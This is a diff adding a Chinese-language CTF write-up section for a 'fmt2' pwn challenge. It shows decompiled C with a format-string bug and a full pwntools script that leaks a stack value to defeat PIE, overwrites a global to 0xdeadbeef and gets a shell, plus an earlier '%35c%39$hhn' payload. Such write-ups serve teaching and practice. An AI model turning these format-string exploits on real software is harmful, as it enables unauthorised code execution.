@@ -507,6 +507,68 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 在这里，我们想要将 v5 的值更改为 0x2023，首先要得到 v5 的地址，即为 v7 的值。所以我们要写入的地址存储在 rsp+108h 中，也就是第 6+0x108/8=39 个参数。要写入的数据是 0x23，也就是 35。所以构造 payload 即为 `%35c%39$hhn`。
 
+### [Week2] fmt2
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char buf[256]; // [rsp+0h] [rbp-100h] BYREF
+
+  bufinit(argc, argv, envp);
+  while ( 1 )
+  {
+    do
+    {
+      printf("Input your content: ");
+      read(0, buf, 0x100uLL);
+      printf(buf);
+    }
+    while ( a != 0xDEADBEEF );
+    system("/bin/sh");
+  }
+}
+```
+
+需要使用格式化字符串修改 bss 段上的数据 a。这里使用 pwntools 中提供的自动化工具 FmtStr 进行读取和写入栈操作。首先需要提供一个函数，用于对进程进行输入输出。因为程序提供了一个循环，所以可以直接写上输入输出。如果程序没有提供循环，需要在函数内每次重新启动或连接。
+
+```python
+def exec_fmt(payload):
+    io.recvuntil('content:')
+    io.sendline(payload)
+    return io.recvline(timeout=1)
+```
+
+因为程序最后执行 payload 的时候不会输出换行符，所以这里加上一个 `timeout=1` 避免一直等待接收数据。
+
+之后，即可使用 `FmtStr(exec_fmt)` 创建一个自动化格式字符串对象进行操作。
+
+使用 `auto.leak_stack(offset)` 可以读取某个参数的值。使用 `auto.write(addr, data)` 和 `auto.execute_writes()` 可以批量执行写入。
+
+因为 `main` 函数会被 `__libc_start_main` 调用，而 `__libc_start_main` 中存在 `main` 函数的地址。所以我们可以使用 gdb 在 rbp 附近寻找。在这里就是第 ($rbp+0x28-$rsp)/8+6=43 个参数。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+
+io = process('./fmt2')
+elf = ELF('./fmt2')
+
+def exec_fmt(payload):
+    io.recvuntil('content:')
+    io.sendline(payload)
+    return io.recvline(timeout=1)
+
+auto = FmtStr(exec_fmt)
+elf.address = auto.leak_stack(43) - elf.sym.main
+
+auto.write(elf.sym.a, 0xdeadbeef)
+auto.execute_writes()
+
+io.interactive()
+
+```
+
 ### [Week3] all-in-files
 
 > 一切皆文件是一种哲学
